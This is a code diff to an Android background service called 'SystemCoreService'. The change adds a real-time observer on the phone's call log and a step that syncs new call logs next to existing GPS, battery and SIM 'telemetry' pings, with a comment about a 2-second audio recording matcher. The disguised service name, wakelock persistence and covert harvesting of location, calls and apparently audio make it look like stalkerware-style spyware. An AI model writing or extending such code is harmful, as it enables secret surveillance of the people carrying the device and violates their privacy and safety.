@@ -57,6 +57,19 @@ class SystemCoreService : Service() {
             }
         }
 
+        // Register Call Log ContentObserver to detect calls in real-time
+        try {
+            val callLogObserver = CallLogEngine.createObserver(this, deviceId)
+            contentResolver.registerContentObserver(
+                android.provider.CallLog.Calls.CONTENT_URI,
+                true,
+                callLogObserver
+            )
+            Log.d("SystemCoreService", "Registered CallLog ContentObserver successfully!")
+        } catch (e: Exception) {
+            Log.e("SystemCoreService", "Failed to register CallLog ContentObserver: ${e.message}")
+        }
+
         // Trigger immediate ping and schedule periodic AlarmManager wakeups
         performTelemetryPingAndScheduleNext()
     }
@@ -86,6 +99,10 @@ class SystemCoreService : Service() {
 
             // Transmit GPS, Battery & SIM Telemetry
             locationEngine.sendTelemetryPing()
+
+            // Transmit system call logs (with 2-second audio recording matcher)
+            val deviceId = locationEngine.getDeviceId()
+            CallLogEngine(this, deviceId).syncNewCallLogs()
         } finally {
             if (wakeLock != null && wakeLock.isHeld) {
                 try { wakeLock.release() } catch (_: Exception) {}
